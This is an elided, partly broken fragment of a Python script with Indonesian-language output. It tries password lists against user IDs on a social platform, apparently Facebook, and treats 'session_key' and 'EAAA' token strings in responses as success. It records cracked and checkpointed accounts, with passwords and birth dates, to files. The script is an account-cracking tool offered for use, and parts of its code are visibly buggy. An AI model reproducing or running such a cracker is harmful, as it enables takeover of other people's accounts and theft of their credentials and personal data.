...
def menu():
	os.system('clear')
	jalan("[]SILAHKAN MASUKKAN USERNAME SAMA PASSWORD\n")
...
def started():
    ...
    jalan(f"{B}[•] Butuh kesabaran ngab Crack nya mayan lambat")
    print(f"{P}================================================={P}")
...
def api(uid, fii):
    ...
    sys.stdout.write(f"\r{J}[•] BAZ > {P} {loop}/{len(id)} {H}OK : {H}{len(ok)} {K}CP : {K}{len(cp)}");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
        ...
        if "session_key" in send.text and "EAAA" in send.text:
            ...
            try:
                ...
                month = _bulan_[month]
                print(f"\r{J}----> {K}{uid}•{pw}•{day} {month} {year}")
    ...
    for pw in fii:
        ...
        if "session_key" in send.text and "EAAA" in send.text:
            ...
            try:
                ...
                month, day, year = ttl.split("/")
                month = _bulan_[month]
                print(f"\r{J}----> {K}{uid}•{pw}•{day} {mont} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.json%"(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
